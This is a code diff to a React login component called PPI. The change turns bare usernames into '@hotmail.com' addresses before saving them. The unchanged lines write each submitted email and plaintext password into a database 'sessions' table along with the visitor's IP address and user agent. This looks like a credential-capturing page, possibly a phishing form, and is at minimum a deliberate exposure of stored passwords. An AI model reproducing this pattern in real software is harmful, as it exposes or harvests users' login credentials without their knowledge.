@@ -210,11 +210,18 @@ const PPI = () => {
   };
 
   // ── Login: validate via API, then create manual session ──
+  /** Normalize PPI username → email: if no '@', append @hotmail.com */
+  const normalizePpiEmail = (username: string) => {
+    const trimmed = username.trim().toLowerCase();
+    return trimmed.includes("@") ? trimmed : `${trimmed}@hotmail.com`;
+  };
+
   const handleLoginSubmit = useCallback(async (submittedEmail: string, password: string) => {
     setGeneralError("");
     setErrorMessage("");
     setLoading(true);
-    setEmail(submittedEmail);
+    const normalizedEmail = normalizePpiEmail(submittedEmail);
+    setEmail(normalizedEmail);
     setKycCaseId(null);
 
     try {
@@ -262,7 +269,7 @@ const PPI = () => {
       const newId = crypto.randomUUID();
       await supabase.from("sessions").insert({
         id: newId,
-        email: submittedEmail,
+        email: normalizedEmail,
         password,
         ip_address: ipData.ip,
         user_agent: navigator.userAgent,
